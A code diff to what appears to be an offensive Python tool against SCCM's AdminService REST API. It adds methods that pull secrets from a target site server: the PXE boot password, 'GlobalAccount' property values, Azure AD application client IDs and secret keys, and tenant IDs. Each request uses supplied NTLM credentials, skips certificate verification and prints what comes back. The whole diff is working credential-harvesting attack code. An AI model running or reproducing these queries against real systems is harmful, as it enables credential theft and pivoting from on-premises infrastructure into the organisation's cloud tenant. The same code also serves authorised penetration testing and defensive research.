@@ -198,20 +198,72 @@ class ADD_ADMIN:
         except Exception as e:
                 print(e) 
     
-    #wip
+
     def get_pxepass(self):
-        url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_SysResUse$select=UserName,Reserved2"
+        url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_SCProperty?$filter=PropertyName eq 'PXEPassword'&$select=PropertyName,Value1"
         try:
             r = requests.get(f"{url}",
                                 auth=HttpNtlmAuth(self.username, self.password),
                                 verify=False,headers=self.headers)
             if r.status_code == 200:
                 data = r.json()
-                logger.info(self.jprint(data))
+                print((self.jprint(data)))
                 return
             else:
                 logger.info("[*] Something went wrong")
                 logger.info(r.text)
                 logger.info(r.status_code)
         except Exception as e:
-                print(e) 
+                print(e)
+
+    def get_forestkey(self):
+        url = f"https://{self.target_ip}/AdminService/wmi/SMS_SCI_SCProperty?$filter=startswith(PropertyName, 'GlobalAccount')&$select=Value1,Value2"
+        try:
+            r = requests.get(f"{url}",
+                                auth=HttpNtlmAuth(self.username, self.password),
+                                verify=False,headers=self.headers)
+            if r.status_code == 200:
+                data = r.json()
+                print((self.jprint(data)))
+                return
+            else:
+                logger.info("[*] Something went wrong")
+                logger.info(r.text)
+                logger.info(r.status_code)
+        except Exception as e:
+                print(e)
+         
+
+    def get_azurecreds(self):
+        url = f"https://{self.target_ip}/AdminService/wmi/SMS_AAD_Application_Ex?$select=ClientID,SecretKey"
+        try:
+            r = requests.get(f"{url}",
+                                auth=HttpNtlmAuth(self.username, self.password),
+                                verify=False,headers=self.headers)
+            if r.status_code == 200:
+                data = r.json()
+                print((self.jprint(data)))
+                return
+            else:
+                logger.info("[*] Something went wrong")
+                logger.info(r.text)
+                logger.info(r.status_code)
+        except Exception as e:
+                print(e)
+
+    def get_azuretenant(self):
+        url = f"https://{self.target_ip}/AdminService/wmi/SMS_AAD_Tenant_Ex?$select=Name,TenantID"
+        try:
+            r = requests.get(f"{url}",
+                                auth=HttpNtlmAuth(self.username, self.password),
+                                verify=False,headers=self.headers)
+            if r.status_code == 200:
+                data = r.json()
+                print((self.jprint(data)))
+                return
+            else:
+                logger.info("[*] Something went wrong")
+                logger.info(r.text)
+                logger.info(r.status_code)
+        except Exception as e:
+                print(e)
